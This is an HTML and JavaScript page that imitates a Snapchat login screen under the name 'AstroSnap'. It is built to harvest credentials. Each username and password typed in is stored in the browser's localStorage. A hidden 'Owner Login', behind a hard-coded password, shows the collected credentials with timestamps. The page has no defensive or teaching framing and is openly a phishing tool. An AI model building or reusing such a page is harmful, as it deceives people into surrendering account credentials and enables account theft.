<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>AstroSnap</title>
<style>
    * {
        box-sizing: border-box;
    }
    body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        font-family: Arial, sans-serif;
        background: #FFFC00;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
    }
    .login-page, .owner-page {
        background: white;
        border-radius: 12px;
        width: 320px;
        padding: 24px 24px 32px;
        box-shadow: 0 8px 20px rgba(0,0,0,0.1);
        display: flex;
        flex-direction: column;
        align-items: center;
    }
    .login-page {
        text-align: center;
    }
    h2 {
        margin-bottom: 20px;
        font-weight: 700;
        font-size: 1.8rem;
        color: #1a1a1a;
        user-select: none;
    }
    input[type="text"], input[type="password"] {
        width: 100%;
        padding: 12px 14px;
        margin-bottom: 14px;
        border: 1.5px solid #ddd;
        border-radius: 8px;
        font-size: 1rem;
        transition: border-color 0.25s ease;
    }
    input[type="text"]:focus, input[type="password"]:focus {
        outline: none;
        border-color: #10b981;
        box-shadow: 0 0 5px rgba(16,185,129,0.4);
    }
    button {
        width: 100%;
        padding: 12px 0;
        background: #10b981;
        border: none;
        border-radius: 8px;
        color: white;
        font-weight: 700;
        font-size: 1.1rem;
        cursor: pointer;
        transition: background-color 0.3s ease;
        user-select: none;
    }
    button:hover, button:focus {
        background: #059669;
        outline: none;
    }
    /* Owner switch button */
    .owner-switch-btn {
        margin-top: 16px;
        background: transparent;
        color: #10b981;
        font-weight: 600;
        font-size: 0.9rem;
        cursor: pointer;
        border: none;
        text-decoration: underline;
        user-select: none;
        padding: 6px 0;
        width: auto;
    }
    .owner-switch-btn:hover {
        color: #047857;
    }
    /* Owner page styles */
    .owner-page {
        max-height: 85vh;
        width: 400px;
        padding: 20px 24px 24px;
        overflow-y: auto;
    }
    .owner-header {
        width: 100%;
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
    }
    .owner-header h2 {
        margin: 0;
        font-size: 1.5rem;
        color: #065f46;
    }
    .cred-list {
        width: 100%;
        border-top: 2px solid #d1fae5;
    }
    .cred-entry {
        background: #f0fdf4;
        margin-top: 12px;
        border-radius: 8px;
        padding: 12px 16px;
        box-shadow: inset 0 0 4px rgba(16,185,129,0.15);
        font-size: 1rem;
        color: #065f46;
        user-select: text;
    }
    .cred-entry strong {
        color: #065f46;
    }
    .cred-field {
        margin-bottom: 6px;
        word-wrap: break-word;
    }
    .owner-page::-webkit-scrollbar {
        width: 8px;
    }
    .owner-page::-webkit-scrollbar-thumb {
        background: #10b981;
        border-radius: 4px;
    }
    /* Accessibility & focus */
    button:focus, input:focus {
        outline-offset: 2px;
        outline: 2px solid #059669;
    }
</style>
</head>
<body>

<!-- Login Page -->
<div class="login-page" id="loginPage" role="main" aria-label="Login page">
    <h2>üîê Snapchat Login</h2>
    <form id="loginForm" autocomplete="off" novalidate>
        <input type="text" id="username" name="username" placeholder="Username" required aria-required="true" aria-label="Username" autocomplete="username" />
        <input type="password" id="password" name="password" placeholder="Password" required aria-required="true" aria-label="Password" autocomplete="current-password" />
        <button type="submit" aria-label="Submit login credentials">Login</button>
    </form>
    <button class="owner-switch-btn" aria-label="Switch to owner view" onclick="ownerLogin()">Owner Login</button>
</div>

<!-- Owner Page -->
<div class="owner-page" id="ownerPage" role="main" aria-label="Owner credentials view" style="display:none;">
    <div class="owner-header">
        <h2>Collected Credentials</h2>
        <button id="ownerLogoutBtn" aria-label="Logout owner view" title="Logout">Logout</button>
    </div>
    <button id="refreshCredListBtn" style="margin-bottom:16px; background:#059669; border:none; border-radius:6px; padding:8px 12px; color:#fff; cursor:pointer;">Refresh List</button>
    <div id="credList" class="cred-list" aria-live="polite" aria-relevant="additions"></div>
</div>

<script>
  // Constants
  const OWNER_PASSWORD = 'owneraccess123';

  // Get DOM elements
  const loginPage = document.getElementById('loginPage');
  const ownerPage = document.getElementById('ownerPage');
  const loginForm = document.getElementById('loginForm');
  const credList = document.getElementById('credList');
  const ownerLogoutBtn = document.getElementById('ownerLogoutBtn');
  const refreshCredListBtn = document.getElementById('refreshCredListBtn');

  // Escape HTML utility for security
  function escapeHtml(text) {
    return String(text)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }

  // Load credentials array from localStorage or return empty array
  function loadCredentials() {
    const creds = localStorage.getItem('credentials');
    try {
      return creds ? JSON.parse(creds) : [];
    } catch {
      localStorage.removeItem('credentials');
      return [];
    }
  }

  // Save credentials array to localStorage
  function saveCredentials(creds) {
    localStorage.setItem('credentials', JSON.stringify(creds));
  }

  // Add a new credential
  function addCredential(username, password) {
    const creds = loadCredentials();
    creds.push({
      id: Date.now() + '-' + Math.random().toString(36).slice(2),
      username: username || 'N/A',
      password: password || 'N/A',
      timestamp: new Date().toLocaleString()
    });
    saveCredentials(creds);
  }

  // Render credentials in owner page
  function renderCredentials() {
    const creds = loadCredentials();
    if (creds.length === 0) {
      credList.innerHTML = '<p>No credentials collected yet.</p>';
      return;
    }
    credList.innerHTML = '';
    creds.slice().reverse().forEach(cred => {
      const div = document.createElement('div');
      div.className = 'cred-entry';
      div.setAttribute('tabindex', '0');
      div.innerHTML = `
        <div class="cred-field"><strong>Username:</strong> ${escapeHtml(cred.username)}</div>
        <div class="cred-field"><strong>Password:</strong> ${escapeHtml(cred.password)}</div>
        <div class="cred-field" style="font-size:0.8rem; color:#064e3b;">Submitted: ${escapeHtml(cred.timestamp)}</div>
      `;
      credList.appendChild(div);
    });
  }

  // Clear input fields
  function clearInputs() {
    loginForm.username.value = '';
    loginForm.password.value = '';
    loginForm.username.focus();
  }

  // Handle form submission
  loginForm.addEventListener('submit', function(event) {
    event.preventDefault();
    const username = loginForm.username.value.trim();
    const password = loginForm.password.value;
    if (!username || !password) {
      alert('Please enter both username and password.');
      return;
    }
    addCredential(username, password);
    clearInputs();
    alert('Credentials saved. You remain on this screen.');
  });

  // Owner logout button click
  ownerLogoutBtn.addEventListener('click', function() {
    ownerPage.style.display = 'none';
    loginPage.style.display = 'flex';
    clearInputs();
  });

  // Refresh credentials list button click
  refreshCredListBtn.addEventListener('click', renderCredentials);

  // Owner login function called by onclick inline attribute
  function ownerLogin() {
    const enteredPass = prompt('Enter owner password to access collected credentials:');
    if (enteredPass === OWNER_PASSWORD) {
      loginPage.style.display = 'none';
      ownerPage.style.display = 'flex';
      renderCredentials();
      ownerLogoutBtn.focus();
    } else if (enteredPass !== null) {
      alert('Incorrect password.');
    }
  }

  // Expose ownerLogin to global scope for inline onclick
  window.ownerLogin = ownerLogin;

  // Initially focus username input on page load
  loginForm.username.focus();
</script>

</body>
</html>
